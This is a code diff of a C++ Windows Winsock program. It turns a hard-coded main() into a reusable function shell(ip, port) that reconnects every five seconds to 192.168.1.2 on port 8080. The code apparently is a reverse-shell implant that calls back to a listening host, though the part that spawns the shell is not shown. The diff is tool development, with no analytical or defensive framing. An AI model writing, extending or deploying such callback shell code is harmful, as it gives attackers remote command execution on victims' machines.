@@ -5,7 +5,7 @@
 #pragma comment(lib, "Ws2_32.lib")
 constexpr auto default_buffer_length = 1024;
 
-void main()
+void shell(wchar_t* ip, int port)
 {
     while (true) {
         Sleep(5000);
@@ -26,8 +26,8 @@ void main()
 
         sockaddr_in address{};
         address.sin_family = AF_INET;
-        InetPton(AF_INET, TEXT("192.168.1.2"), &address.sin_addr.s_addr);
-        address.sin_port = htons(8080);
+        InetPton(AF_INET, ip, &address.sin_addr.s_addr);
+        address.sin_port = htons(port);
 
         if (WSAConnect(my_socket, reinterpret_cast<SOCKADDR*>(&address), sizeof(address), nullptr, nullptr, nullptr, nullptr) == SOCKET_ERROR) {
             closesocket(my_socket);
@@ -71,4 +71,11 @@ void main()
             break;
         }
     }
+}
+
+int main()
+{
+	wchar_t ip[12] = L"192.168.1.2";
+    int port = 8080;
+    shell(ip, port);
 }
